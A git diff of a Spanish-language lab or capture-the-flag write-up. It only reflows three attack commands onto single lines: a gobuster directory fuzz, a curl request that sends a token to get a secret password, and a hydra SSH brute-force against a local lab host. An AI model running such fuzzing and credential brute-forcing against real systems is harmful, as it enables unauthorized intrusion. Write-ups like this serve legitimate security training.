@@ -115,9 +115,7 @@ Se descubren los siguientes directorios:
 Luego, repetimos el fuzzing en `/javascript`:
 
 ```bash
-gobuster dir -u http://172.17.0.3/javascript \
--w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
--t 20 -add-slash -b 403,404 -x php,html,txt
+gobuster dir -u http://172.17.0.3/javascript -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
 ```
 
 Rutas encontradas:
@@ -160,9 +158,7 @@ Este endpoint espera un token específico. Si lo recibe, revela una contraseña.
 Realizamos una solicitud `POST` con `curl` para obtener la contraseña secreta:
 
 ```bash
-curl -X POST http://172.17.0.3:3000/recurso/ \
--H "Content-Type: application/json" \
--d '{"token":"tokentraviesito"}'
+curl -X POST http://172.17.0.3:3000/recurso/ -H "Content-Type: application/json" -d '{"token":"tokentraviesito"}'
 ```
 
 Respuesta del servidor:
@@ -180,9 +176,7 @@ lapassworddebackupmaschingonadetodas
 Ya que tenemos la contraseña, ahora buscamos el **usuario** que la utiliza. Lo hacemos con `hydra`, usando `rockyou.txt` como diccionario de usuarios y especificando el puerto `5000` para SSH:
 
 ```bash
-hydra -L /usr/share/wordlists/rockyou.txt \
--p lapassworddebackupmaschingonadetodas \
-ssh://172.17.0.3:5000 -t 4
+hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.3:5000 -t 4
 ```
 
 Resultado:
